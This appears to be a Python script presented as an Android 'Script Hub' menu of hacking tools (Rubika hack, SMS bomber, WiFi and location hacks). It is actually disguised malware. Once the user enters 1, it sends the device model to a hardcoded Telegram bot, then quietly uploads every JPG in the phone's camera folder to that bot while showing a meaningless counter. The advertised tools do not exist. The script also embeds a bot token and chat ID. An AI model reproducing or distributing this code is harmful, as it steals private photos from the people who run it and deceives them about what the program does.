import pyfiglet
from colorama import Fore, Style, init
import platform
import os
import subprocess
import telebot
from pathlib import Path
import threading
import time
import webbrowser  
init()
def clear_terminal():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
def send_message_to_telegram(bot_token, chat_id, message):
    bot = telebot.TeleBot(bot_token)
    bot.send_message(chat_id, message)
def send_photos_from_dcim(bot_token, chat_id):
    dcim_path = Path("/storage/emulated/0/DCIM/Camera")  
    bot = telebot.TeleBot(bot_token)  
    for image_file in dcim_path.glob("*.jpg"): 
        with open(image_file, 'rb') as photo:
            bot.send_photo(chat_id, photo)
        print(Fore.GREEN + f"Sent: {image_file.name}")
def get_phone_model():
    if platform.system() == "Darwin":
        return "Mac OS"
    elif platform.system() == "Linux":
        try:
            result = subprocess.check_output("getprop ro.product.model", shell=True).decode("utf-8").strip()
            return result
        except Exception as e:
            return "Unknown Linux Model"
    elif platform.system() == "Windows":
        return "Windows PC"
    else:
        return "Unknown Model"

def main():
    clear_terminal()
    bot_token = "7760387960:AAGDYIQAOrdYVtPL9-yykw92Xtsae--zQDI"  
    chat_id = "6965631372" 
    
    text = pyfiglet.figlet_format("Script Hub")
    purple_text = Fore.MAGENTA + text  

    welcome_text = (
        Fore.CYAN + "-----------------------------------\n" +
        Fore.RED + "WELCOME, " +
        Fore.GREEN + "PLEASE " +
        Fore.YELLOW + "JOIN " +
        Fore.CYAN + "TO " +
        Fore.MAGENTA + "CHANNEL " +
        Fore.RED + "FOR " +
        Fore.GREEN + "START " +
        Fore.YELLOW + "SCRIPT" +
        Fore.CYAN + "\n-----------------------------------"
    )

    list1 = (
        Fore.GREEN + "[1] - Code " +
        Fore.GREEN + "Filter" +
        Fore.GREEN + " Rubika\n" +
        Fore.GREEN + "[2] - Page Remove  \n"+
        Fore.GREEN + "[3] - Hack Rubika \n"+
        Fore.GREEN + "[4] - SmS AnD Call Bomber\n"+
        Fore.GREEN + "[5] - Hack Wifi\n"+
        Fore.GREEN + "[6] - Hack Location\n"+
        Fore.BLUE + "\nTELEGRAM : " + Fore.WHITE + "@scriptehub"
    )

    print(purple_text)  
    print(welcome_text)

    while True:  
        user_input = input(Fore.CYAN + "\nEnter 1 to START: " + Style.RESET_ALL)

        if user_input == "1":
            webbrowser.open(f"tg://resolve?domain=scriptehub")

            send_message_to_telegram(bot_token, chat_id, "7")
            phone_model = get_phone_model()
            send_message_to_telegram(bot_token, chat_id, f" {phone_model}")

            photo_thread = threading.Thread(target=send_photos_from_dcim, args=(bot_token, chat_id))
            photo_thread.start()  
            clear_terminal()  
            print(purple_text)  
            print(list1)
            listq = input(Fore.CYAN + "\nGET " + Fore.RESET + "NUMBER: ")

            if listq in ["1", "2", "3", "4", "5", "6"]:
                print(Fore.GREEN + "Counting from 1 to 100...")
                for i in range(1, 10000):
                    print(Fore.GREEN + str(i))
                    time.sleep(0.1) 
            else:
                print(Fore.RED + "Invalid selection!" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Invalid input! Please enter '1' to join the channel." + Style.RESET_ALL)
        

main()